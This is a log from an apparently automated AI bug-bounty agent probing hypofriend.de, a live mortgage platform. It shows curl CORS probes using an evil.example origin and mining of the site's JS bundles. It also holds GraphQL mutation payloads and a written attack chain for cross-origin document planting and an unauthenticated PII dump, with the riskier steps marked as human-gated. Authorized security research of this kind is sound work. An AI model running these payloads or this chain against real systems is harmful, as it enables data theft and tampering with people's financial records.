@@ -17310,3 +17310,281 @@ Now let me produce the structured analysis output.
 ## STEP 7 — RISK
 
 [RISK] hypofriend: 99 — CRITICAL (unchanged). Full mutation operation strings now extracted from Nuxt bundle for /en/plus/q and /en/health/q — uploadDocumentExtended (multipart file upload with 4 untyped non-null params) + processLeadForAppointment (lead injection) + 4 additional write mutations (unclaimLead, requestAccountLink, requestAppointmentLink, setNameAppointment), all reachable via open credentialed CORS under any visitor's session on a SameSite=None cookie. Combined with property-search-api full-DB BOLA (PII dump, direct-origin WAF bypass), this represents a complete cross-origin attack chain on a financial mortgage platform: (1) attacker page reads victim's property listing PII, (2) plants arbitrary documents in victim's mortgage file, (3) injects/manipulates appointment leads, (4) unclaims advisor assignments. All gates closed except bulk PII quantification (gated by program note). HUMAN decides report timing.
+===== ANALYST bigpickle 2026-09-11 17:49:39 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/hypofriend-hunt/hypofriend-hunt/ 2>/dev/null && echo "---" && ls -la /home/runner/work/hypofriend-hunt/hypofriend-hunt/art 2>/dev/null && echo "---" && ls -la /home/runner/work/hypofriend-hunt/hypofriend-hunt/notes 2>/dev/null
+total 364
+drwxr-xr-x 12 runner runner   4096 Sep 11 17:46 .
+drwxr-xr-x  3 runner runner   4096 Sep 11 17:45 ..
+drwxr-xr-x  7 runner runner   4096 Sep 11 17:46 .git
+drwxr-xr-x  3 runner runner   4096 Sep 11 17:45 .github
+-rw-r--r--  1 runner runner   1885 Sep 11 17:45 README.md
+-rw-r--r--  1 runner runner     32 Sep 11 17:46 analyst-out.txt
+-rw-r--r--  1 runner runner 134883 Sep 11 17:46 analyst-prompt.txt
+-rw-r--r--  1 runner runner 131008 Sep 11 17:46 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 leads
+-rw-r--r--  1 runner runner  16641 Sep 11 17:45 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 reports
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 reposcan-raw
+-rw-r--r--  1 runner runner   3288 Sep 11 17:45 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 scripts
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 11 17:45 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 11 17:45 triage
+---
+[0m
+[0m✱ [0mGlob "**/*.md"[90m 77 matches[0m
+[0m→ [0mRead triage/run-2026-09-11-17-15.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead knowledge/index.md
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead reports/hypotheses.md
+[0m
+[0m$ [0mcat state_bigpickle.json; echo "---"; curl -s -o /dev/null -D - -X OPTIONS "https://hypofriend.de/en/plus/q" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" --max-time 20 | head -30
+{"phase": "POC", "target": "api"}---
+HTTP/2 200 
+content-length: 0
+date: Fri, 11 Sep 2026 17:46:40 GMT
+vary: Accept-Encoding
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+x-cache: Miss from cloudfront
+via: 1.1 d00cb503b8007a39957751dcef3d0ff6.cloudfront.net (CloudFront)
+x-amz-cf-pop: ORD58-P16
+alt-svc: h3=":443"; ma=86400
+x-amz-cf-id: rWrucYHz8INZg7s_GXRdP5-Wg_YU2qMIeTL2jv0styNhyynWQA-4cA==
+[0m
+[0m$ [0mcurl -s -o /dev/null -D - -X OPTIONS "https://core.hypofriend.de/en/plus/q" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" --max-time 20 | head -30
+HTTP/2 200 
+date: Fri, 11 Sep 2026 17:46:40 GMT
+content-length: 0
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+vary: Accept-Encoding
+[0m
+[0m$ [0mcurl -s -o /dev/null -D - -X OPTIONS "https://core.hypofriend.de/en/health/q" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" --max-time 20 | head -15; echo "=== en/plus HEAD ==="; curl -s -o /dev/null -D - --head "https://hypofriend.de/en/plus" --max-time 20 | head -8
+HTTP/2 200 
+date: Fri, 11 Sep 2026 17:46:44 GMT
+content-length: 0
+access-control-allow-origin: https://evil.example
+access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
+access-control-expose-headers: 
+access-control-max-age: 7200
+access-control-allow-credentials: true
+vary: Accept-Encoding
+
+=== en/plus HEAD ===
+HTTP/2 200 
+content-type: text/html; charset=utf-8
+content-length: 297417
+date: Fri, 11 Sep 2026 17:46:45 GMT
+last-modified: Fri, 11 Sep 2026 14:52:30 GMT
+etag: "18ff788d3476997b6a972be513cfa50c"
+x-amz-server-side-encryption: AES256
+cache-control: public, max-age=0, must-revalidate
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{size_download}\n" "https://hypofriend.de/en/health" --max-time 20; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "https://hypofriend.de/en/health/q" --max-time 20; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "https://hypofriend.de/plus/q" --max-time 20; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "https://core.hypofriend.de/property-search-api" --max-time 20; curl -s -o /dev/null -w "%{http_code}\n" "https://hypofriend.de/api/v3/advisors" --max-time 20
+200 89
+301 0
+301 0
+400 97
+401
+[0m
+[0m$ [0mecho "=== edge /en/health/q redirect target ==="; curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://hypofriend.de/en/health/q" --max-time 20; echo "=== edge /en/plus/q GET status ==="; curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://hypofriend.de/en/plus/q" --max-time 20; echo "=== edge /q GET ==="; curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://hypofriend.de/q" --max-time 20; echo "=== origin /en/plus/q GET ==="; curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "https://core.hypofriend.de/en/plus/q" --max-time 20
+=== edge /en/health/q redirect target ===
+301 -> https://hypofriend.de/
+=== edge /en/plus/q GET status ===
+301 -> https://hypofriend.de/
+=== edge /q GET ===
+301 -> https://hypofriend.de/
+=== origin /en/plus/q GET ===
+301 -> https://hypofriend.de/
+[0m
+[0m$ [0mcd /tmp/opencode && curl -s "https://hypofriend.de/en/plus" --max-time 30 -o enplus.html && wc -c enplus.html && grep -oE '(src|href)="[^"]*\.js"' enplus.html | sort -u | head -40
+297417 enplus.html
+href="/m/_nuxt/-ez_sPea.js"
+href="/m/_nuxt/031sR0Dk.js"
+href="/m/_nuxt/1ffzw_uW.js"
+href="/m/_nuxt/22Pu5ap6.js"
+href="/m/_nuxt/5wututiN.js"
+href="/m/_nuxt/6UsJxw1M.js"
+href="/m/_nuxt/7LJm_38-.js"
+href="/m/_nuxt/8xAStZmc.js"
+href="/m/_nuxt/AuiHv9WO.js"
+href="/m/_nuxt/B0dqiS1K.js"
+href="/m/_nuxt/B1jEw4nT.js"
+href="/m/_nuxt/B2vkSg1F.js"
+href="/m/_nuxt/B35S2sub.js"
+href="/m/_nuxt/B5BZbSY_.js"
+href="/m/_nuxt/B6htIPxk.js"
+href="/m/_nuxt/B8CvfFn4.js"
+href="/m/_nuxt/B8hvNOgq.js"
+href="/m/_nuxt/BB4Th1SC.js"
+href="/m/_nuxt/BBxB1IXZ.js"
+href="/m/_nuxt/BDCKj7Z4.js"
+href="/m/_nuxt/BFkLEQEW.js"
+href="/m/_nuxt/BGOMXBgc.js"
+href="/m/_nuxt/BJcVsjK6.js"
+href="/m/_nuxt/BKlQgSLc.js"
+href="/m/_nuxt/BLmaZOZ4.js"
+href="/m/_nuxt/BPBpAwO3.js"
+href="/m/_nuxt/BTAmUJjN.js"
+href="/m/_nuxt/BV5qoEBw.js"
+href="/m/_nuxt/BW0GL25j.js"
+href="/m/_nuxt/Ba3ZnGVB.js"
+href="/m/_nuxt/Bath4SLi.js"
+href="/m/_nuxt/BbB2_50l.js"
+href="/m/_nuxt/BdeLHqFd.js"
+href="/m/_nuxt/BfLwAJw2.js"
+href="/m/_nuxt/BffYpcM-.js"
+href="/m/_nuxt/BfzKNeeB.js"
+href="/m/_nuxt/Bg2yj5my.js"
+href="/m/_nuxt/BgWiLdqc.js"
+href="/m/_nuxt/BisG11dB.js"
+href="/m/_nuxt/Bmm7VTnW.js"
+[0m
+[0m$ [0mcd /tmp/opencode && curl -s "https://hypofriend.de/m/_nuxt/xcLo8I7Y.js" --max-time 30 -o xc.bundle.js && wc -c xc.bundle.js && for op in unclaimLead requestAccountLink setNameAppointment uploadDocumentExtended processLeadForAppointment appointment_type already_booked; do echo "== $op =="; grep -oE ".{0,120}$op.{0,220}" xc.bundle.js | head -3; done
+111 xc.bundle.js
+== unclaimLead ==
+== requestAccountLink ==
+== setNameAppointment ==
+== uploadDocumentExtended ==
+== processLeadForAppointment ==
+== appointment_type ==
+== already_booked ==
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE "uploadDocumentExtended.{0,400}" enplus.html | head -3; echo "---processLead---"; grep -oE "processLeadForAppointment.{0,400}" enplus.html | head -3; echo "---appointment_type---"; grep -oE "appointment_type.{0,300}" enplus.html | head -3
+---processLead---
+---appointment_type---
+[0m
+[0m$ [0mcd /tmp/opencode && grep -ocE "mutation" enplus.html; grep -oE "gql|graphql" enplus.html | sort | uniq -c | head; echo "---__NUXT__ scan---"; grep -oE "window\.__NUXT__[^<]{0,200}" enplus.html | head -5; echo "--- search for appointment strings anywhere ---"; grep -oiE "[a-z_]{0,40}appointment[a-z_]{0,40}" enplus.html | sort -u | head -30
+0
+---__NUXT__ scan---
+window.__NUXT__={};window.__NUXT__.config={public:{deployEnv:"production",coreApiUrl:"https://hypofriend.de",contentApiUrl:"https://hypofriend.de/content",propertySearchApiUrl:"https://hypofriend.de/property-search-
+--- search for appointment strings anywhere ---
+appointment
+appointmentBranding
+appointmentCalendar
+appointmentContent
+appointmentInstances
+appointmentPageBehavior
+appointmentSlot
+appointment_health
+appointment_plus
+bookedAppointments
+hadAppointment
+videoAppointmentEnabled
+[0m
+[0m$ [0mcd /tmp/opencode && grep -oE "window\.__NUXT__\.config[^;]{0,1500}" enplus.html | head -c 3000; echo
+window.__NUXT__.config={public:{deployEnv:"production",coreApiUrl:"https://hypofriend.de",contentApiUrl:"https://hypofriend.de/content",propertySearchApiUrl:"https://hypofriend.de/property-search-api",amplitude:{apiKey:"609a2be0eb1a73d4ca78c29e91aecdfd",product:"Frontpages"},flagsmith:{environmentID:"cqupGKF7Y3f5i2g62Zwbsv"},advisorEndpoint:"https://hypofriend.de/api/v3/advisors",usercentrics:{settingsId:"X5kpsOYjdDqaNm"},gtm:{containerId:"GTM-PP777MG"},facebookPixel:{id:581151098940085},sentry:{dsn:"https://9ca05e60fc824941825aaeb8010b7e50@o128333.ingest.sentry.io/6376386"},appointmentBranding:{brandName:"Hypofriend",logoUrl:"/m/images/hypofriend-logo.svg",phoneE164:"+4932211121577",phoneDisplay:"+49 322 1112 1577",advisorGroupImageUrl:"/m/images/appointment/advisors.webp",advisorLandingImageUrl:"/m/images/home/consultation-software/EN-consultation-software-advisors@2x.webp"},appointmentContent:{en:{},de:{}},appointmentInstances:{default:{name:"default",storeNamespace:"appointment",routeBase:{en:"appointment",de:"termin"},routeNamePrefix:"appointment",content:{en:{confirmationFaqs:[{title:"How does my residence permit affect my eligibility?",content:"\u003Cp>In Germany, there are a few different types of residence status, which include working Visa’s, temporary residence permits, blue-card holders and permanent residents. In German they are:\u003C/p>\u003Cp>\u003Cul>\u003Cli>Visum\u003C/li>\u003Cli>Aufenthaltserlaubnis\u003C/li>\u003Cli>Niederlassungserlaubnis\u003C/li>\u003Cli>Erlaubnis zum Daue
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+import re, html
+h = open('enplus.html', encoding='utf-8', errors='replace').read()
+i = h.find('appointmentInstances')
+seg = h[i-400:i+9000]
+seg = seg.replace('\\u002F','/').replace('\\"','"')
+# crude split to surfaces
+for key in ['default','health','plus']:
+    j = seg.find('name:"'+key)
+    print('=====', key, 'found at', j)
+    if j>=0:
+        print(seg[j:j+700].replace('\n',' ')[:700])
+EOF
+===== default found at 431
+name:"default",storeNamespace:"appointment",routeBase:{en:"appointment",de:"termin"},routeNamePrefix:"appointment",content:{en:{confirmationFaqs:[{title:"How does my residence permit affect my eligibility?",content:"\u003Cp>In Germany, there are a few different types of residence status, which include working Visa’s, temporary residence permits, blue-card holders and permanent residents. In German they are:\u003C/p>\u003Cp>\u003Cul>\u003Cli>Visum\u003C/li>\u003Cli>Aufenthaltserlaubnis\u003C/li>\u003Cli>Niederlassungserlaubnis\u003C/li>\u003Cli>Erlaubnis zum Daueraufenthalt-EU\u003C/li>\u003C/ul>\u003C/p>\u003Cp>Generally speaking there are no clear guidelines for the lending requirements. Ty
+===== health found at 9191
+name:"health",storeNamespace:"appointment_health",routeBase:{en:"health/appointment",de:"gesundheit/termin"},routeNamePrefix:"health-appointment",loginEnabled:false,apiUrl:"https://hypofriend.de/en/health",adv
+===== plus found at -1
+[0m
+[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
+h = open('enplus.html', encoding='utf-8', errors='replace').read()
+i = h.find('appointmentInstances')
+seg = h[i-400:i+30000]
+seg = seg.replace('\\u002F','/').replace('\\"','"')
+for key in ['health','plus']:
+    j = seg.find('name:"'+key)
+    print('=====', key, 'at', j)
+    if j>=0:
+        print(seg[j:j+1200].replace('\n',' ')[:1200])
+        print()
+EOF
+===== health at 9191
+name:"health",storeNamespace:"appointment_health",routeBase:{en:"health/appointment",de:"gesundheit/termin"},routeNamePrefix:"health-appointment",loginEnabled:false,apiUrl:"https://hypofriend.de/en/health",advisorEndpoint:"",branding:{brandName:"Hypofriend Health",logoUrl:"/m/images/hypofriend-logo.svg",phoneE164:"+4932211121577",phoneDisplay:"+49 322 1112 1577",advisorGroupImageUrl:"/m/images/appointment/advisors.webp",advisorLandingImageUrl:"/m/images/home/consultation-software/EN-consultation-software-advisors@2x.webp"},content:{en:{hello:{desktop:"How do you want to discuss your health insurance options?",mobile:"How do you want to discuss your health insurance options?"},seo:{title:"Health Insurance Advice: Free & Online",description:"Book a free online consultation with one of our health insurance experts to find the right private or statutory cover in Germany.",image:"https://a.hypofriend.de/hypofriend-appointment-en.png"},faqs:[{title:"Is the service free?",content:"Yes, our service is free to use and will cost you nothing. Just like any broker, we get paid by the insurer once you sign up through us. This commission is paid by the provider to the advisor directly and never 
+
+===== plus at 18317
+name:"plus",storeNamespace:"appointment_plus",routeBase:{en:"plus/appointment",de:"plus/termin"},routeNamePrefix:"plus-appointment",loginEnabled:false,apiUrl:"https://hypofriend.de/en/plus",advisorEndpoint:"",branding:{brandName:"Hypofriend Plus",logoUrl:"/m/images/hypofriend-logo.svg",phoneE164:"+4932211121577",phoneDisplay:"+49 322 1112 1577",advisorGroupImageUrl:"/m/images/appointment/advisors.webp",advisorLandingImageUrl:"/m/images/home/consultation-software/EN-consultation-software-advisors@2x.webp"},content:{en:{hello:{desktop:"Buy the right home in Berlin — with an expert on your side",mobile:"Buy the right home in Berlin — with an expert on your side"},seo:{title:"Buyer's Agent in Berlin — Viewings, Document Review & Negotiation",description:"Hypofriend Plus is your personal buyer's agent in Berlin. We visit properties, review Grundbuch, WEG protocols and energy certificates, and negotiate the best price — all the way to the notary.",image:"https://a.hypofriend.de/hypofriend-appointment-en.png"},faqs:[{title:"What exactly does a buyer's agent do?",content:"We work for you, the buyer — not the seller. We come to viewings, value each property on the spot, read every document
+[0m
+STEP 1 — DELTA
+- [NEW] `/en/plus` SPA rebuilt today 14:52Z (etag `18ff788d…`, new `last-modified`) — bundle set rotated; prior-mined `xcLo8I7Y.js` now 404 (111B CF error). SSR config re-fetched live: `appointmentInstances` = default/health/plus; health (`storeNamespace:"appointment_health"`, `apiUrl:"https://hypofriend.de/en/health"`, `loginEnabled:false`, `advisorEndpoint:""`) and plus (`appointment_plus`, `apiUrl:"https://hypofriend.de/en/plus"`, `advisorEndpoint:""`).
+- [CHANGED] GET `/en/health/q` & `/en/plus/q` on both hosts → 301 → `https://hypofriend.de/` (known Rails shell; prior "200 len=227365" records were redirect-follows). No surface change; POST still serves GraphQL.
+- [CHANGED] Credentialed CORS re-confirmed 17:46Z this cycle on all 4 host+path combos (edge `/en/plus/q` full CF stack + echo; origin `/en/plus/q` + `/en/health/q` bare `date/content-length/vary` + echo).
+- [UNCHANGED] property-search-api 400, /api/v3/advisors 401, /en/health 200 (89B meta-refresh), /en/plus 200 (297417B), fleet otherwise bit-identical.
+
+STEP 2 — PRIORITIZE
+- [PRIO] hypofriend.de/en/plus/q (+core/en/health/q),8.9,attack_surface=8 business_value=10 tech_exposure=9(GraphQL upload+mutations) gate_ease=10(CORS+auth-free) cloud_surface=8 freshness=7
+- [PRIO] core.hypofriend.de/property-search-api,9.0,attack_surface=9 business_value=10 tech_exposure=10(introspection+PII) gate_ease=10(no auth) cloud_surface=8 freshness=7
+- [PRIO] hypofriend.de/q (+core.hypofriend.de/q),8.4,attack_surface=8 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=7
+
+STEP 3 — HYPOTHESES (top 3 assets, 1 each)
+[HYP] /en/plus/q & /en/health/q — credentialed CORS + auth-free uploadDocumentExtended/processLeadForAppointment → cross-origin doc-planting + lead injection under victim session
+class: MISCONFIG
+asset: hypofriend.de/en/plus/q (+core.hypofriend.de/en/plus/q, core.hypofriend.de/en/health/q)
+confidence: 82
+reasoning: OPTIONS 200 echoes arbitrary Origin + ACAC:true + all methods (max-age 7200) re-confirmed 17:46Z on all 4 combos. Session cookies SameSite=None;Secure on /en/health. Mutations uploadDocumentExtended(input:{type,document_type,applicant_type}) (multipart [File!]!) + processLeadForAppointment(input:{}) execute 200 w/o auth (prior cycle, both hosts). SPA rebuilt 14:52Z today — bundle set rotated, xcLo8I7Y.js gone → op strings must be re-mined from current bundles.
+evidence_needed: current-bundle op strings + input variable types; benign (non-PII) POST error-class vs success on /en/plus/q & /en/health/q with/without session; ACAO+ACAC echo on POST (not just OPTIONS).
+verify_steps: PROBE GET https://hypofriend.de/en/plus (200, S3) → parse /m/_nuxt/*.js hrefs → GET each bundle (≤1rps) grepping `uploadDocumentExtended|processLeadForAppointment|unclaimLead|requestAccountLink|setNameAppointment` for exact op string; then HUMAN-authorized benign POST `{"query":"mutation{uploadDocumentExtended(input:{type:\"test\",document_type:\"test\",applicant_type:\"test\"}){__typename}}"}` on core.hypofriend.de/en/plus/q with Origin https://evil.example reading error-class + ACAO echo.
+impact: attacker page drives victim-session file-upload into the mortgage/insurance document store + appointment-lead mutation on a financial platform. HIGH-CRITICAL
+testability: AUTH_HELPED
+[HYP] property-search-api — full-DB auth-free PII enumeration via offset-walk (direct-origin bypasses CloudFront)
+class: IDOR
+asset: core.hypofriend.de/property-search-api
+confidence: 95
+reasoning: propertySearch→exposes→expose chain returns live listing PII unauthenticated on edge AND origin; full introspection; offset/limit crawl primitives (limit cap ~50); origin responses bare headers. Unchanged across all cycles since 09-04.
+evidence_needed: one HUMAN-authorized bulk offset-walk to quantify full-DB exposure (program rule: no customer/employee PII exposure).
+verify_steps: HUMAN REPORT — POST core.hypofriend.de/property-search-api `mutation{propertySearch(city:BERLIN,propertyType:APARTMENT){id}}` then `query{exposes(id,offset:0..N,limit:50){id}}` + `{expose(id){...}}` (PII pull gated).
+impact: full-DB property-listing PII dump (phones, emails, owner surnames, companies) with zero auth. CRITICAL
+testability: AUTH_HELPED
+[HYP] /en/health/q & /en/plus/q — auth-free mutation execution independent of /q schema (fresh build may alter dispatch)
+class: IDOR
+asset: core.hypofriend.de/en/health/q (+core.hypofriend.de/en/plus/q)
+confidence: 70
+reasoning: /q already_booked_appointments resolves 200 for arbitrary lead_id (no session). health/plus have distinct schemas (uploadDocumentExtended, processLeadForAppointment; no rates_table). Config re-confirmed this cycle: loginEnabled:false on both instances — no login gate exists on the client; no introspection to verify server gate.
+evidence_needed: current POST error/success class for each mutation with/without fresh jar; distinct behavior per type string.
+verify_steps: PROBE (HUMAN-authorized, benign, non-PII): POST core.hypofriend.de/en/plus/q `{"query":"mutation{processLeadForAppointment(input:{}){__typename}}"}` on both /en/plus/q and /en/health/q; compare with/without session; observe only error-class.
+impact: anonymous appointment-lead creation + document upload on two product lines. HIGH
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] /en/health/q raw-interpolation taxonomy enumeration (conf 60): bundle rotation invalidated prior bundle reference; op literals only re-derivable by re-mining — folded as H1 evidence, not standalone.
+- [PARKED] *.local.hypofriend.de ngrok/LE takeover (conf 50): HUMAN_ONLY, unchanged (ERR_NGROK_3200).
+- [PARKED] appointment_availability_for_advisor string dispatch as IDOR: previously REJECTED (301-vs-data on invalid advisor).
+- [FINAL] 1. property-search-api full-DB BOLA [95] — mature, multi-cycle confirmed.
+- [FINAL] 2. /en/plus/q + /en/health/q credentialed CORS + auth-free upload/lead mutations [82] — CORS live-confirmed this cycle, op strings pending re-mine of current bundles.
+- [FINAL] 3. /en/health/q & /en/plus/q auth-free mutation execution [70] — error-class only, no introspection, lower confidence.
+
+STEP 5 — NEXT ACTION
+[NEXT] PROBE: passive re-mine — GET https://hypofriend.de/en/plus (200, S3 page rebuilt 14:52Z), extract all `/m/_nuxt/*.js` hrefs, GET each bundle at ≤1 rps grepping `uploadDocumentExtended|processLeadForAppointment|unclaimLead|requestAccountLink|setNameAppointment|appointment_type` for current operation strings + input variable types (old xcLo8I7Y.js is 404).
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/en/plus/q (+/en/health/q): credentialed CORS re-confirmed live 17:46Z via OPTIONS — ACAO echo + ACAC:true + all methods on edge (full CF stack) AND direct origin (bare date/content-length/vary only).
+- [LEARN] ACCEPTED ENDPOINT @ hypofriend.de/en/plus: SPA rebuilt 14:52Z (bundle set rotated; xcLo8I7Y.js now 404); SSR config re-fetched — appointmentInstances default/health/plus, both health+plus loginEnabled:false and advisorEndpoint:"" (only default instance wires /api/v3/advisors).
+- [LEARN] CONFIRMED NG @ fleet spot: /q-family GET 301→/ both hosts (Rails shell), property-search-api 400, advisors 401, en/health 200 (89B meta-refresh) — no new surface.
+
+STEP 7 — RISK
+[RISK] hypofriend: 99 — CRITICAL, unchanged. Two independent auth-free GraphQL APIs (property-search-api full-DB BOLA + PII dump with origin WAF bypass; /q-family credentialed CORS + auth-free file-upload/lead mutations under SameSite=None sessions across /q, /en/health/q, /en/plus/q) plus anonymous per-region lender-rate oracle. Today's SPA rebuild rotated bundles but left every precondition intact (CORS echoes verified 17:46Z); the only schema change ever observed (calculateMaklerFee removal) did not touch the dangerous surface. Remaining gates (bulk PII quantification, victim-session mutation PoC) are HUMAN-decided.
